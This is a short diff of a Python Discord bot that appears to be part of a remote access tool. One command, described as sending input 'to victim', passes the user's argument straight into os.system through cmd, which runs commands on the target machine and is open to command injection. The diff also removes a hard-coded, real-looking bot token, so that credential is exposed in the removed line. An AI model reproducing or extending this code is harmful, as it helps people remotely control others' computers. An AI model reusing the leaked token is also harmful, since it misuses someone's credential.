@@ -113,5 +113,5 @@ async def echo(ctx, arg):
         f'Sending {arg} to victim')
     await os.system(f'cmd /k "echo {arg}"')
 
-token = 'MTA1OTg3MzUwMzc2MDg5MTkzNA.G7ZdKh.YRjIBnHhe6v6MyQM8MZ-GtiMA7821Bm6XkHN_s'
+token = 'BOT TOKEN'
 bot.run(token)
